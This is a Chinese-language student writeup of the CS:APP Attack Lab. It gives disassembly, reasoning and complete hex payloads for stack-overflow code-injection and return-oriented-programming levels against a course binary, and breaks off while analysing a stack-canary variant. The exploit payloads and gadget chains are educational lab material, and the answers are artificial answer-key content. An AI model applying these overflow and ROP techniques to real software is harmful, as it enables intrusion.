# Attacklab Writeup 

[`assemble`](./target35/assemble)中存储了各个可执行文件利用`objdump`反汇编的结果

[`answers`](./target35/answers)中以字节形式存储了各题目的答案，需使用[`hex2raw`](./target35/hex2raw)得到真正的输入，具体使用方式见[指导文档](./attacklab-readme.pdf)附录A

[`proc`](./target35/proc)中存储了解题时所用到的中间文件

## Part I: Code Injection Attacks

<details>

<summary>
    <code>test</code>和<code>getbuf</code>反汇编
</summary>

```
00000000004021b5 <test>:
  4021b5:	f3 0f 1e fa          	endbr64 
  4021b9:	48 83 ec 08          	sub    $0x8,%rsp
  4021bd:	b8 00 00 00 00       	mov    $0x0,%eax
  4021c2:	e8 55 fd ff ff       	call   401f1c <getbuf>
  4021c7:	89 c2                	mov    %eax,%edx
  4021c9:	48 89 e0             	mov    %rsp,%rax
  4021cc:	48 83 e0 0f          	and    $0xf,%rax
  4021d0:	74 07                	je     4021d9 <aligned4>
  4021d2:	b9 00 00 00 00       	mov    $0x0,%ecx
  4021d7:	eb 05                	jmp    4021de <done4>
```

```
0000000000401f1c <getbuf>:
  401f1c:	f3 0f 1e fa          	endbr64 
  401f20:	48 83 ec 38          	sub    $0x38,%rsp
  401f24:	48 89 e7             	mov    %rsp,%rdi
  401f27:	e8 cd 03 00 00       	call   4022f9 <Gets>
  401f2c:	b8 01 00 00 00       	mov    $0x1,%eax
  401f31:	48 83 c4 38          	add    $0x38,%rsp
  401f35:	c3                   	ret   
```
函数开辟了56个字节的栈空间，只要输入超过56字节，就可以修改调用者栈帧最下面的返回地址。

</details>

### Level 1

<details>

<summary>
    <code>touch1</code>反汇编
</summary>


```
0000000000401fe6 <touch1>:
  401fe6:	f3 0f 1e fa          	endbr64 
  401fea:	50                   	push   %rax
  401feb:	58                   	pop    %rax
  401fec:	48 83 ec 08          	sub    $0x8,%rsp
  401ff0:	c7 05 22 55 00 00 01 	movl   $0x1,0x5522(%rip)        # 40751c <vlevel>
  401ff7:	00 00 00 
  401ffa:	48 8d 3d 15 23 00 00 	lea    0x2315(%rip),%rdi        # 404316 <_IO_stdin_used+0x316>
  402001:	e8 aa f2 ff ff       	call   4012b0 <puts@plt>
  402006:	bf 01 00 00 00       	mov    $0x1,%edi
  40200b:	e8 5b 05 00 00       	call   40256b <validate>
  402010:	bf 00 00 00 00       	mov    $0x0,%edi
  402015:	e8 f6 f3 ff ff       	call   401410 <exit@plt>
```

</details>

<details>

<summary>
    Level 1解法
</summary>

只需让`getbuf`的返回地址为`401fe6`（`touch1`的地址）即可，注意机器使用小端法存储，故实际输入的字节顺序应为`e6 1f 40`，以后均同理。故答案为
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
e6 1f 40 00 00 00 00 00 
```

</details>

### Level 2

<details>
<summary>
    <code>touch2</code>反汇编
</summary>

```
000000000040201a <touch2>:
  40201a:	f3 0f 1e fa          	endbr64 
  40201e:	50                   	push   %rax
  40201f:	58                   	pop    %rax
  402020:	48 83 ec 08          	sub    $0x8,%rsp
  402024:	89 fa                	mov    %edi,%edx
  402026:	c7 05 ec 54 00 00 02 	movl   $0x2,0x54ec(%rip)        # 40751c <vlevel>
  40202d:	00 00 00 
  402030:	39 3d ee 54 00 00    	cmp    %edi,0x54ee(%rip)        # 407524 <cookie>
  402036:	74 2a                	je     402062 <touch2+0x48>
  402038:	48 8d 35 21 23 00 00 	lea    0x2321(%rip),%rsi        # 404360 <_IO_stdin_used+0x360>
  40203f:	bf 01 00 00 00       	mov    $0x1,%edi
  402044:	b8 00 00 00 00       	mov    $0x0,%eax
  402049:	e8 72 f3 ff ff       	call   4013c0 <__printf_chk@plt>
  40204e:	bf 02 00 00 00       	mov    $0x2,%edi
  402053:	e8 ee 05 00 00       	call   402646 <fail>
  402058:	bf 00 00 00 00       	mov    $0x0,%edi
  40205d:	e8 ae f3 ff ff       	call   401410 <exit@plt>
  402062:	48 8d 35 cf 22 00 00 	lea    0x22cf(%rip),%rsi        # 404338 <_IO_stdin_used+0x338>
  402069:	bf 01 00 00 00       	mov    $0x1,%edi
  40206e:	b8 00 00 00 00       	mov    $0x0,%eax
  402073:	e8 48 f3 ff ff       	call   4013c0 <__printf_chk@plt>
  402078:	bf 02 00 00 00       	mov    $0x2,%edi
  40207d:	e8 e9 04 00 00       	call   40256b <validate>
  402082:	eb d4                	jmp    402058 <touch2+0x3e>
```

</details>

<details>

<summary>
    Level 2解法
</summary>

在调用`touch2`之前，还需先将`cookie`（此处为`0x30cd1ee4`）的值置入`%rdi`中，先编写一段汇编代码[`cl2.s`](./target35/proc/ctarget_level2/cl2.s)
```
movq    $0x30cd1ee4, %rdi
pushq   $0x40201a
ret
```
其中`pushq $0x40201a`将`touch2`的首地址压入栈中，调用`ret`后即可运行`touch2`，另外，需要想办法让程序运行这一段汇编代码，为此，先将其转变为字节形式
```
gcc -c cl2.s
objdump -d cl2.o > cl2.txt
```
得到
```
0000000000000000 <.text>:
   0:	48 c7 c7 e4 1e cd 30 	mov    $0x30cd1ee4,%rdi
   7:	68 1a 20 40 00       	push   $0x40201a
   c:	c3                   	ret   
```
此外，还需要借助`gdb`查看调用`getbuf`时`%rsp`的值
```
gdb -q ctarget 
Reading symbols from ctarget...
(gdb) b *0x401f24
Breakpoint 1 at 0x401f24: file buf.c, line 14.
(gdb) run
Starting program: /target35/ctarget 
Cookie: 0x30cd1ee4
Type string:

Breakpoint 1, getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) i r
...
rsp            0x5563e908          0x5563e908
...
```
接下来利用以上信息进行攻击，由于`getbuf`的`ret`语句并不直接跳转到`touch2`，而是需要跳转到我们增加的代码处并运行，可以将我们增加的代码写在栈顶，并修改调用者栈帧的返回地址为栈顶地址，故答案如下
```
48 c7 c7 e4 1e cd 30 68 
1a 20 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
08 e9 63 55 00 00 00 00 
```

</details>

### Level 3

<details>
<summary>
    <code>touch3</code>和<code>hexmatch</code>反汇编
</summary>

```
000000000040213f <touch3>:
  40213f:	f3 0f 1e fa          	endbr64 
  402143:	53                   	push   %rbx
  402144:	48 89 fb             	mov    %rdi,%rbx
  402147:	c7 05 cb 53 00 00 03 	movl   $0x3,0x53cb(%rip)        # 40751c <vlevel>
  40214e:	00 00 00 
  402151:	48 89 fe             	mov    %rdi,%rsi
  402154:	8b 3d ca 53 00 00    	mov    0x53ca(%rip),%edi        # 407524 <cookie>
  40215a:	e8 25 ff ff ff       	call   402084 <hexmatch>
  40215f:	85 c0                	test   %eax,%eax
  402161:	74 2d                	je     402190 <touch3+0x51>
  402163:	48 89 da             	mov    %rbx,%rdx
  402166:	48 8d 35 1b 22 00 00 	lea    0x221b(%rip),%rsi        # 404388 <_IO_stdin_used+0x388>
  40216d:	bf 01 00 00 00       	mov    $0x1,%edi
  402172:	b8 00 00 00 00       	mov    $0x0,%eax
  402177:	e8 44 f2 ff ff       	call   4013c0 <__printf_chk@plt>
  40217c:	bf 03 00 00 00       	mov    $0x3,%edi
  402181:	e8 e5 03 00 00       	call   40256b <validate>
  402186:	bf 00 00 00 00       	mov    $0x0,%edi
  40218b:	e8 80 f2 ff ff       	call   401410 <exit@plt>
  402190:	48 89 da             	mov    %rbx,%rdx
  402193:	48 8d 35 16 22 00 00 	lea    0x2216(%rip),%rsi        # 4043b0 <_IO_stdin_used+0x3b0>
  40219a:	bf 01 00 00 00       	mov    $0x1,%edi
  40219f:	b8 00 00 00 00       	mov    $0x0,%eax
  4021a4:	e8 17 f2 ff ff       	call   4013c0 <__printf_chk@plt>
  4021a9:	bf 03 00 00 00       	mov    $0x3,%edi
  4021ae:	e8 93 04 00 00       	call   402646 <fail>
  4021b3:	eb d1                	jmp    402186 <touch3+0x47>
```
```
0000000000402084 <hexmatch>:
  402084:	f3 0f 1e fa          	endbr64 
  402088:	41 55                	push   %r13
  40208a:	41 54                	push   %r12
  40208c:	55                   	push   %rbp
  40208d:	53                   	push   %rbx
  40208e:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  402095:	89 fd                	mov    %edi,%ebp
  402097:	48 89 f3             	mov    %rsi,%rbx
  40209a:	41 bc 28 00 00 00    	mov    $0x28,%r12d
  4020a0:	64 49 8b 04 24       	mov    %fs:(%r12),%rax
  4020a5:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  4020aa:	31 c0                	xor    %eax,%eax
  4020ac:	e8 df f2 ff ff       	call   401390 <random@plt>
  4020b1:	48 89 c1             	mov    %rax,%rcx
  4020b4:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  4020bb:	0a d7 a3 
  4020be:	48 f7 ea             	imul   %rdx
  4020c1:	48 01 ca             	add    %rcx,%rdx
  4020c4:	48 c1 fa 06          	sar    $0x6,%rdx
  4020c8:	48 89 c8             	mov    %rcx,%rax
  4020cb:	48 c1 f8 3f          	sar    $0x3f,%rax
  4020cf:	48 29 c2             	sub    %rax,%rdx
  4020d2:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  4020d6:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  4020da:	48 c1 e0 02          	shl    $0x2,%rax
  4020de:	48 29 c1             	sub    %rax,%rcx
  4020e1:	4c 8d 2c 0c          	lea    (%rsp,%rcx,1),%r13
  4020e5:	41 89 e8             	mov    %ebp,%r8d
  4020e8:	48 8d 0d 44 22 00 00 	lea    0x2244(%rip),%rcx        # 404333 <_IO_stdin_used+0x333>
  4020ef:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4020f6:	be 01 00 00 00       	mov    $0x1,%esi
  4020fb:	4c 89 ef             	mov    %r13,%rdi
  4020fe:	b8 00 00 00 00       	mov    $0x0,%eax
  402103:	e8 48 f3 ff ff       	call   401450 <__sprintf_chk@plt>
  402108:	ba 09 00 00 00       	mov    $0x9,%edx
  40210d:	4c 89 ee             	mov    %r13,%rsi
  402110:	48 89 df             	mov    %rbx,%rdi
  402113:	e8 78 f1 ff ff       	call   401290 <strncmp@plt>
  402118:	85 c0                	test   %eax,%eax
  40211a:	0f 94 c0             	sete   %al
  40211d:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
  402122:	64 49 33 1c 24       	xor    %fs:(%r12),%rbx
  402127:	75 11                	jne    40213a <hexmatch+0xb6>
  402129:	0f b6 c0             	movzbl %al,%eax
  40212c:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  402133:	5b                   	pop    %rbx
  402134:	5d                   	pop    %rbp
  402135:	41 5c                	pop    %r12
  402137:	41 5d                	pop    %r13
  402139:	c3                   	ret    
  40213a:	e8 9e 06 00 00       	call   4027dd <__stack_chk_fail>
```

</details>

<details>

<summary>
    Level 3解法
</summary>

需要将`cookie`作为字符串传入并比较，即从`0x30cd1ee4`转为`"30cd1ee4"`，应该传入的字节则为（末尾应补零）
```
33 30 63 64 31 65 65 34 00
```
在`hexmatch`中，由于`*s`存放的地址是随机的，如果我们将数据放在`getbuf`的栈空间里面，有可能在调用这两个函数的过程中被覆盖，因此需要把数据放到一个相对安全的栈空间里，可以选择放在调用`getbuf`的函数`test`中。

下面的步骤与level2基本一致
- 查看`test`栈指针位置为`0x5563e948`，`getbuf`栈指针位置为`5563e908`
- 编写将`test`栈空间地址送到`%rdi`中，并将`touch3`首地址压栈再`ret`的汇编代码[`cl3.s`](./target35/proc/ctarget_level3/cl3.s)，转换为字节得到
    ```
    48 c7 c7 48 e9 63 55 68 
    3f 21 40 00 c3
    ```

最终答案为
```
48 c7 c7 48 e9 63 55 68 
3f 21 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
08 e9 63 55 00 00 00 00
33 30 63 64 31 65 65 34 
00
```

</details>

## Part II: Return-Oriented Programming

### Level 2

<details>

<summary>
    可用的gadget
</summary>

```
000000000040224c <start_farm>:
  40224c:	f3 0f 1e fa          	endbr64 
  402250:	b8 01 00 00 00       	mov    $0x1,%eax
  402255:	c3                   	ret    

0000000000402256 <addval_198>:
  402256:	f3 0f 1e fa          	endbr64 
  40225a:	8d 87 48 99 c7 90    	lea    -0x6f3866b8(%rdi),%eax
  402260:	c3                   	ret    

0000000000402261 <addval_121>:
  402261:	f3 0f 1e fa          	endbr64 
  402265:	8d 87 48 89 c7 c1    	lea    -0x3e3876b8(%rdi),%eax
  40226b:	c3                   	ret    

000000000040226c <setval_160>:
  40226c:	f3 0f 1e fa          	endbr64 
  402270:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  402276:	c3                   	ret    

0000000000402277 <addval_326>:
  402277:	f3 0f 1e fa          	endbr64 
  40227b:	8d 87 13 d8 90 90    	lea    -0x6f6f27ed(%rdi),%eax
  402281:	c3                   	ret    

0000000000402282 <addval_102>:
  402282:	f3 0f 1e fa          	endbr64 
  402286:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
  40228c:	c3                   	ret    

000000000040228d <setval_277>:
  40228d:	f3 0f 1e fa          	endbr64 
  402291:	c7 07 77 cb 58 91    	movl   $0x9158cb77,(%rdi)
  402297:	c3                   	ret    

0000000000402298 <getval_471>:
  402298:	f3 0f 1e fa          	endbr64 
  40229c:	b8 58 90 c3 ae       	mov    $0xaec39058,%eax
  4022a1:	c3                   	ret    

00000000004022a2 <getval_125>:
  4022a2:	f3 0f 1e fa          	endbr64 
  4022a6:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  4022ab:	c3                   	ret    

00000000004022ac <mid_farm>:
  4022ac:	f3 0f 1e fa          	endbr64 
  4022b0:	b8 01 00 00 00       	mov    $0x1,%eax
  4022b5:	c3   
```

</details>

<details>

<summary>
    Level 2解法
</summary>

提示表明我们只用两个gadget即可完成，可以猜测需要一个`mov`来转移参数，另一个则为`pop`，通过比对可以找到`popq %rax`对应的`58`编码和`movq %rax, %rdi`对应的`48 89 c7`编码，分别位于以下的gadget中，起始位置分别为`0x40229d`和`0x4022a7`
```
0000000000402298 <getval_471>:
  402298:	f3 0f 1e fa          	endbr64 
  40229c:	b8 58 90 c3 ae       	mov    $0xaec39058,%eax
  4022a1:	c3                   	ret    

00000000004022a2 <getval_125>:
  4022a2:	f3 0f 1e fa          	endbr64 
  4022a6:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  4022ab:	c3                   	ret    
```

分析栈帧，设`%rsp`表示`getbuf`读取输入时的栈指针

<center>

|   地址    |   功能    |   应存储的值    |
|:-:|:-:|:-:|
|`56(%rsp)~63(%rsp)`|  `getbuf`返回位置  | `popq %rax`的地址 |
|`64(%rsp)~71(%rsp)`| 被`pop`的数        | `cookie`         |
|`72(%rsp)~79(%rsp)`| `popq %rax`之后`ret`的返回地址        | `movq %rax, %rdi`的地址         |
|`80(%rsp)~87(%rsp)`| `movq %rax, %rdi`之后`ret`的返回地址        | `touch2`的地址         |

</center>

故答案如下
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
9d 22 40 00 00 00 00 00 
e4 1e cd 30 00 00 00 00
a7 22 40 00 00 00 00 00 
6a 1f 40 00 00 00 00 00 
```

</details>

### Level 3

<details>

<summary>
    可用的gadget
</summary>

```
000000000040224c <start_farm>:
  40224c:	f3 0f 1e fa          	endbr64 
  402250:	b8 01 00 00 00       	mov    $0x1,%eax
  402255:	c3                   	ret    

0000000000402256 <addval_198>:
  402256:	f3 0f 1e fa          	endbr64 
  40225a:	8d 87 48 99 c7 90    	lea    -0x6f3866b8(%rdi),%eax
  402260:	c3                   	ret    

0000000000402261 <addval_121>:
  402261:	f3 0f 1e fa          	endbr64 
  402265:	8d 87 48 89 c7 c1    	lea    -0x3e3876b8(%rdi),%eax
  40226b:	c3                   	ret    

000000000040226c <setval_160>:
  40226c:	f3 0f 1e fa          	endbr64 
  402270:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  402276:	c3                   	ret    

0000000000402277 <addval_326>:
  402277:	f3 0f 1e fa          	endbr64 
  40227b:	8d 87 13 d8 90 90    	lea    -0x6f6f27ed(%rdi),%eax
  402281:	c3                   	ret    

0000000000402282 <addval_102>:
  402282:	f3 0f 1e fa          	endbr64 
  402286:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
  40228c:	c3                   	ret    

000000000040228d <setval_277>:
  40228d:	f3 0f 1e fa          	endbr64 
  402291:	c7 07 77 cb 58 91    	movl   $0x9158cb77,(%rdi)
  402297:	c3                   	ret    

0000000000402298 <getval_471>:
  402298:	f3 0f 1e fa          	endbr64 
  40229c:	b8 58 90 c3 ae       	mov    $0xaec39058,%eax
  4022a1:	c3                   	ret    

00000000004022a2 <getval_125>:
  4022a2:	f3 0f 1e fa          	endbr64 
  4022a6:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  4022ab:	c3                   	ret    

00000000004022ac <mid_farm>:
  4022ac:	f3 0f 1e fa          	endbr64 
  4022b0:	b8 01 00 00 00       	mov    $0x1,%eax
  4022b5:	c3                   	ret    

00000000004022b6 <add_xy>:
  4022b6:	f3 0f 1e fa          	endbr64 
  4022ba:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4022be:	c3                   	ret    

00000000004022bf <getval_321>:
  4022bf:	f3 0f 1e fa          	endbr64 
  4022c3:	b8 48 89 e0 c2       	mov    $0xc2e08948,%eax
  4022c8:	c3                   	ret    

00000000004022c9 <addval_301>:
  4022c9:	f3 0f 1e fa          	endbr64 
  4022cd:	8d 87 89 c1 28 c0    	lea    -0x3fd73e77(%rdi),%eax
  4022d3:	c3                   	ret    

00000000004022d4 <getval_151>:
  4022d4:	f3 0f 1e fa          	endbr64 
  4022d8:	b8 48 89 e0 92       	mov    $0x92e08948,%eax
  4022dd:	c3                   	ret    

00000000004022de <getval_280>:
  4022de:	f3 0f 1e fa          	endbr64 
  4022e2:	b8 31 4a 89 e0       	mov    $0xe0894a31,%eax
  4022e7:	c3                   	ret    

00000000004022e8 <setval_305>:
  4022e8:	f3 0f 1e fa          	endbr64 
  4022ec:	c7 07 e0 9d 8d d6    	movl   $0xd68d9de0,(%rdi)
  4022f2:	c3                   	ret    

00000000004022f3 <setval_221>:
  4022f3:	f3 0f 1e fa          	endbr64 
  4022f7:	c7 07 89 ca 18 d2    	movl   $0xd218ca89,(%rdi)
  4022fd:	c3                   	ret    

00000000004022fe <setval_348>:
  4022fe:	f3 0f 1e fa          	endbr64 
  402302:	c7 07 89 d6 84 d2    	movl   $0xd284d689,(%rdi)
  402308:	c3                   	ret    

0000000000402309 <setval_426>:
  402309:	f3 0f 1e fa          	endbr64 
  40230d:	c7 07 89 c1 08 c9    	movl   $0xc908c189,(%rdi)
  402313:	c3                   	ret    

0000000000402314 <setval_489>:
  402314:	f3 0f 1e fa          	endbr64 
  402318:	c7 07 09 ca 90 c3    	movl   $0xc390ca09,(%rdi)
  40231e:	c3                   	ret    

000000000040231f <addval_196>:
  40231f:	f3 0f 1e fa          	endbr64 
  402323:	8d 87 88 c1 c3 5a    	lea    0x5ac3c188(%rdi),%eax
  402329:	c3                   	ret    

000000000040232a <addval_469>:
  40232a:	f3 0f 1e fa          	endbr64 
  40232e:	8d 87 99 c1 20 d2    	lea    -0x2ddf3e67(%rdi),%eax
  402334:	c3                   	ret    

0000000000402335 <getval_229>:
  402335:	f3 0f 1e fa          	endbr64 
  402339:	b8 99 ca 90 90       	mov    $0x9090ca99,%eax
  40233e:	c3                   	ret    

000000000040233f <setval_215>:
  40233f:	f3 0f 1e fa          	endbr64 
  402343:	c7 07 89 d6 90 c3    	movl   $0xc390d689,(%rdi)
  402349:	c3                   	ret    

000000000040234a <setval_287>:
  40234a:	f3 0f 1e fa          	endbr64 
  40234e:	c7 07 88 d6 90 c3    	movl   $0xc390d688,(%rdi)
  402354:	c3                   	ret    

0000000000402355 <getval_164>:
  402355:	f3 0f 1e fa          	endbr64 
  402359:	b8 89 ca 78 c9       	mov    $0xc978ca89,%eax
  40235e:	c3                   	ret    

000000000040235f <getval_110>:
  40235f:	f3 0f 1e fa          	endbr64 
  402363:	b8 89 c1 90 c3       	mov    $0xc390c189,%eax
  402368:	c3                   	ret    

0000000000402369 <getval_228>:
  402369:	f3 0f 1e fa          	endbr64 
  40236d:	b8 89 d6 60 db       	mov    $0xdb60d689,%eax
  402372:	c3                   	ret    

0000000000402373 <setval_255>:
  402373:	f3 0f 1e fa          	endbr64 
  402377:	c7 07 89 ca 20 c0    	movl   $0xc020ca89,(%rdi)
  40237d:	c3                   	ret    

000000000040237e <addval_220>:
  40237e:	f3 0f 1e fa          	endbr64 
  402382:	8d 87 89 c1 91 90    	lea    -0x6f6e3e77(%rdi),%eax
  402388:	c3                   	ret    

0000000000402389 <setval_199>:
  402389:	f3 0f 1e fa          	endbr64 
  40238d:	c7 07 48 89 e0 94    	movl   $0x94e08948,(%rdi)
  402393:	c3                   	ret    

0000000000402394 <getval_401>:
  402394:	f3 0f 1e fa          	endbr64 
  402398:	b8 09 d6 38 c0       	mov    $0xc038d609,%eax
  40239d:	c3                   	ret    

000000000040239e <getval_282>:
  40239e:	f3 0f 1e fa          	endbr64 
  4023a2:	b8 99 ca 84 c9       	mov    $0xc984ca99,%eax
  4023a7:	c3                   	ret    

00000000004023a8 <setval_432>:
  4023a8:	f3 0f 1e fa          	endbr64 
  4023ac:	c7 07 48 09 e0 90    	movl   $0x90e00948,(%rdi)
  4023b2:	c3                   	ret    

00000000004023b3 <getval_373>:
  4023b3:	f3 0f 1e fa          	endbr64 
  4023b7:	b8 ee 89 d6 c2       	mov    $0xc2d689ee,%eax
  4023bc:	c3                   	ret    

00000000004023bd <setval_335>:
  4023bd:	f3 0f 1e fa          	endbr64 
  4023c1:	c7 07 73 48 89 e0    	movl   $0xe0894873,(%rdi)
  4023c7:	c3                   	ret    

00000000004023c8 <setval_210>:
  4023c8:	f3 0f 1e fa          	endbr64 
  4023cc:	c7 07 89 ca 28 c0    	movl   $0xc028ca89,(%rdi)
  4023d2:	c3                   	ret    

00000000004023d3 <addval_461>:
  4023d3:	f3 0f 1e fa          	endbr64 
  4023d7:	8d 87 48 89 e0 90    	lea    -0x6f1f76b8(%rdi),%eax
  4023dd:	c3                   	ret    

00000000004023de <addval_127>:
  4023de:	f3 0f 1e fa          	endbr64 
  4023e2:	8d 87 76 89 c1 92    	lea    -0x6d3e768a(%rdi),%eax
  4023e8:	c3                   	ret    

00000000004023e9 <getval_317>:
  4023e9:	f3 0f 1e fa          	endbr64 
  4023ed:	b8 89 c1 a4 c0       	mov    $0xc0a4c189,%eax
  4023f2:	c3                   	ret    

00000000004023f3 <setval_437>:
  4023f3:	f3 0f 1e fa          	endbr64 
  4023f7:	c7 07 89 ca 84 c0    	movl   $0xc084ca89,(%rdi)
  4023fd:	c3                   	ret    

00000000004023fe <addval_411>:
  4023fe:	f3 0f 1e fa          	endbr64 
  402402:	8d 87 48 88 e0 c3    	lea    -0x3c1f77b8(%rdi),%eax
  402408:	c3                   	ret    

0000000000402409 <addval_219>:
  402409:	f3 0f 1e fa          	endbr64 
  40240d:	8d 87 89 d6 a4 d2    	lea    -0x2d5b2977(%rdi),%eax
  402413:	c3                   	ret    

0000000000402414 <end_farm>:
  402414:	f3 0f 1e fa          	endbr64 
  402418:	b8 01 00 00 00       	mov    $0x1,%eax
  40241d:	c3                   	ret    
```

</details>

<details>

<summary>
    Level 3解法
</summary>

`touch3`需要传`cookie`的字符串起点指针作为参数，但是由于栈随机化策略，存放字符串的绝对地址是未知的，只能根据运行时的`%rsp`进行计算，因此，解题步骤为
- 在某个位置储存字符串
- 得到某个时刻的`%rsp`
- 用`Imm(%rsp)`作为字符串地址，`Imm`是需要确定的常数

下面先寻找可用的操作

<center>

| 操作 | 字节 | 起始位置 |
|:-:|:-:|:-:|
|`movq %rax, %rdi`| `48 89 c7` | `0x402272`|
|`movq %rsp, %rax`| `48 89 e0` | `0x4023d9` |
|`popq %rax`| `58` | `0x40229d` |
|`popq %rdx`| `5a`|`0x402328`|
|`movl %eax, %ecx`|`89 c1`|`0x402364`|
|`movl %eax, %edi`|`89 c7`|`0x402273`|
|`movl %ecx, %edx`|`89 ca`|`0x402379`|
|`movl %edx, %esi`|`89 d6`|`0x402304`|
|`movl %esp, %eax`|`89 e0`|`0x4022e5`|

</center>

此外，还有一个有用的函数
```
00000000004022b6 <add_xy>:
  4022b6:	f3 0f 1e fa          	endbr64 
  4022ba:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4022be:	c3                   	ret    
```

分析`add_xy`所涉及的寄存器，可以明确我们的目标是将`%rsp`转移到`%rdi`（因为没有`movq %___, %rsi`的可行操作），将`Imm`转移到`%rsi`或`%esi`，可以发现以下的方式，设`%rsp`表示`getbuf`读取输入时的栈指针

<center>

|   地址    |   应存储的值    |
|:-:|:-:|
|`56(%rsp)~63(%rsp)`      | `*(movq %rsp, %rax)`  |
|`64(%rsp)~71(%rsp)`      | `*(movq %rax, %rdi)`  |
|`72(%rsp)~79(%rsp)`      | `*(popq %rax)`        |
|`80(%rsp)~87(%rsp)`      | `Imm`                 |
|`88(%rsp)~95(%rsp)`      | `*(movl %eax, %ecx)`  |
|`96(%rsp)~103(%rsp)`     | `*(movl %ecx, %edx)`  |
|`104(%rsp)~111(%rsp)`    | `*(movl %edx, %esi)`  |
|`112(%rsp)~119(%rsp)`    | `*add_xy`             |
|`120(%rsp)~127(%rsp)`    | `*(movq %rax, %rdi)`  |
|`128(%rsp)~135(%rsp)`    | `touch3`              |
|`136(%rsp)~143(%rsp)`    | `cookie`              |

</center>

容易计算出`Imm = 72 = 0x48`，故答案为
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
d9 23 40 00 00 00 00 00 
72 22 40 00 00 00 00 00 
9d 22 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
64 23 40 00 00 00 00 00 
79 23 40 00 00 00 00 00 
04 23 40 00 00 00 00 00 
b6 22 40 00 00 00 00 00 
72 22 40 00 00 00 00 00 
8f 20 40 00 00 00 00 00 
33 30 63 64 31 65 65 34 
00 
```

</details>

## Part III: Return-Oriented Programming with canary protection

### Level 3

<details>

<summary>
    Level 3解法
</summary>

```
000000000040219c <getbuf_withcanary>:
  40219c:	f3 0f 1e fa          	endbr64 
  4021a0:	55                   	push   %rbp
  4021a1:	48 89 e5             	mov    %rsp,%rbp
  4021a4:	48 81 ec 90 01 00 00 	sub    $0x190,%rsp
  4021ab:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  4021b2:	00 00 
  4021b4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4021b8:	31 c0                	xor    %eax,%eax
  4021ba:	c7 85 74 ff ff ff 00 	movl   $0x0,-0x8c(%rbp)
  4021c1:	00 00 00 
  4021c4:	8b 85 74 ff ff ff    	mov    -0x8c(%rbp),%eax
  4021ca:	89 85 70 ff ff ff    	mov    %eax,-0x90(%rbp)
  4021d0:	48 8d 85 70 fe ff ff 	lea    -0x190(%rbp),%rax
  4021d7:	48 89 c7             	mov    %rax,%rdi
  4021da:	e8 ec 02 00 00       	call   4024cb <Gets>
  4021df:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
  4021e5:	48 63 d0             	movslq %eax,%rdx
  4021e8:	48 8d 85 70 fe ff ff 	lea    -0x190(%rbp),%rax
  4021ef:	48 8d 88 08 01 00 00 	lea    0x108(%rax),%rcx
  4021f6:	48 8d 85 70 fe ff ff 	lea    -0x190(%rbp),%rax
  4021fd:	48 89 ce             	mov    %rcx,%rsi
  402200:	48 89 c7             	mov    %rax,%rdi
  402203:	e8 68 f1 ff ff       	call   401370 <memcpy@plt>
  402208:	8b 85 74 ff ff ff    	mov    -0x8c(%rbp),%eax
  40220e:	48 63 d0             	movslq %eax,%rdx
  402211:	48 8d 85 70 fe ff ff 	lea    -0x190(%rbp),%rax
  402218:	48 8d 8d 70 fe ff ff 	lea    -0x190(%rbp),%rcx
  40221f:	48 81 c1 08 01 00 00 	add    $0x108,%rcx
  402226:	48 89 c6             	mov    %rax,%rsi
  402229:	48 89 cf             	mov    %rcx,%rdi
  40222c:	e8 3f f1 ff ff       	call   401370 <memcpy@plt>
  402231:	b8 01 00 00 00       	mov    $0x1,%eax
  402236:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  40223a:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx
  402241:	00 00 
  402243:	74 05                	je     40224a <getbuf_withcanary+0xae>
  402245:	e8 65 07 00 00       	call   4029af <__stack_chk_fail>
  40224a:	c9                   	leave  
  40224b:	c3                   	ret    
```

考虑里面的两个`memcpy`函数调用，分别执行
- `memcpy(-0x190(%rbp), -0x88(%rbp), (int)(-0x90(%rbp)))`
- `memcpy(-0x88(%rbp), -0x190(%rbp), (int)(-0x8c(%rbp)))`

因此，我们首先需要考虑的便是`-0x88(%rbp), -0x90(%rbp), -0x8c(%rbp)`处的值，同时也需要想办法知道`%fs:0x28`（初始时位于`-0x8(%rbp)`）的值

